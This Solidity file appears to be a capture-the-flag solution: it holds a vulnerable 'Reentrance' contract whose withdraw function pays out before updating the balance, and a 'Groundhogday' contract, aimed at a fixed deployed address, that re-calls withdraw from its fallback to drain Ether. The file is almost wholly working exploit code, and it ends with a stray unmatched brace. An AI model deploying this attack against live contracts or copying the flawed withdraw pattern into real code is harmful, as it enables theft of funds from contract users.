pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract Groundhogday {
  
  address ReentranceAddr = 0xba94eeb004c2d463a6f1e8ceecb7fbb3e12b51c5;
  Reentrance public ReentranceContract;

  function Groundhogday() payable{
    ReentranceContract = Reentrance(ReentranceAddr);
  }

  function giveALittle() public {
    ReentranceContract.donate.value(1 ether)(address(this));

    ReentranceContract.withdraw(1 ether);
  }

  function() public payable /*getALot*/{

    /* even better than I was the last time */
    ReentranceContract.withdraw(1 ether);
  }

}






}